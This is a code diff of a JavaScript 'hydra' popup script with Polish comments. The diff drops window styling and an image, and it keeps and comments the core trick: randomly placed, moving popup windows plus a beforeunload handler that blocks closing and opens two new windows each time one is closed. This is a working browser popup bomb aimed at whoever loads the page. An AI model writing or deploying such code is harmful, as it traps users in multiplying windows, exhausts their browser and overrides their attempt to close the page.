@@ -56,9 +56,9 @@ document.addEventListener('click', function() {
 function openWindow() {
     const { x, y } = getRandomCoords();
     const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`;
-    
+
     // Stała nazwa okna
-    const win = window.open(window.location.pathname, "hydra", opts);
+    const win = window.open("childwin.html", "child_window", opts);
 
     if (!win) {
         alert("Pop-upy są zablokowane! Zezwól na nie w ustawieniach paska adresu.");
@@ -67,39 +67,17 @@ function openWindow() {
 
     wins.push(win);
 
-    // --- Stylowanie i dodawanie obrazu ---
-    const body = win.document.body;
-    body.style.margin = "0";
-    body.style.background = "black";
-    body.style.color = "red";
-    body.style.display = "flex";
-    body.style.flexDirection = "column";
-    body.style.justifyContent = "center";
-    body.style.alignItems = "center";
-    body.style.height = "100vh";
-    body.style.fontFamily = "sans-serif";
-    body.style.textAlign = "center";
-    
-    const img = win.document.createElement("img");
-    img.src = "kowciu.jpg"; // upewnij się, że plik istnieje w repo
-    img.alt = "Obraz";
-    img.style.width = "80%";
-    img.style.maxWidth = "100vw";
-    img.style.height = "auto";
-    img.style.border = "2px solid red";
-    
-    body.appendChild(img);
-
-    // Ruch okna
+    // --- Ruch okna (Hydra) ---
     if (typeof startMovingWindow === 'function') {
         startMovingWindow(win);
     }
 
-    // Hydrauliczny mechanizm (hydra)
+    // --- Mechanizm Hydry (otwieranie kolejnych okien przy zamknięciu) ---
     win.addEventListener("beforeunload", function (e) {
         e.preventDefault();
         e.returnValue = "";
 
+        // Otwieramy 2 kolejne okna
         openWindow();
         openWindow();
     });
